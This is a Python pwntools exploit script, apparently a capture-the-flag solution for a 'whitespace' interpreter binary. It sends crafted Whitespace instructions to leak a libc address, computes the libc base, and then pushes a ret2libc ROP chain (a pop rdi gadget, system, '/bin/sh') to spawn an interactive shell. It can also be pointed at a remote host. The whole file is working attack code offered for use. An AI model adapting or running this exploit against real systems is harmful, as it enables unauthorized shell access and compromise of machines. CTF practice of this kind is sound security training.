import sys
from pwn import *

########################################################
## Helper functions ####################################
########################################################

def push_num(value):
	if type(value) == str:
		value = u64(value)

	out = ""
	out += "  "
	NUM_BITS = 64
	for i in range(0, NUM_BITS):
		if (value >> ((NUM_BITS - 1) - i)) & 1 != 0:
			out += "\t"
		else:
			out += " "
	out += "\n"
	return out

def discard():
	return " \n\n"

def print_num():
	return "\x09\x0A\x20\x09"

def send(p, out):
	p.write(p64(len(out)))
	if len(out) != 0:
		p.write(out)

########################################################
## Setup the connection ################################
########################################################

filename = "./whitespace"
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
	if len(sys.argv) < 3:
		print "Need host and port"
		sys.exit(1)
	p = remote(sys.argv[2], int(sys.argv[3]))
else:
	#p = process([filename])
	p = process(["../install/bin/qemu-x86_64", "-fmin", "0x400000", "-fmax", "0x500000", "./whitespace.mod"])
	if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
		gdb.attach(p)

context.binary = filename
context.log_level = 'debug'

libc_filename = "/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(libc_filename)

########################################################
## Main code flow ######################################
########################################################

libc_start_main_offset = 0x20830

out = ""
out += discard()
out += discard()
out += discard()
out += print_num()
send(p, out)

libc_start_main = int(p.read(16), 16)
libc_base = libc_start_main - libc_start_main_offset
libc.address = libc_base

system = libc.symbols['system']
binsh = libc.search('/bin/sh').next()
poprdiret = libc.search('\x5f\xc3').next()

print "Leaked libc base 0x{:x}".format(libc_base)
print "system address 0x{:x} /bin/sh address 0x{:x}, poprdiret 0x{:x}".format(system, binsh, poprdiret)

out = ""
out += discard()
out += discard()
out += discard()
out += discard()
out += push_num(poprdiret)
out += discard()
out += discard()
out += discard()
out += push_num(system)
out += push_num(binsh)
send(p, out)

send(p, "")

p.interactive()

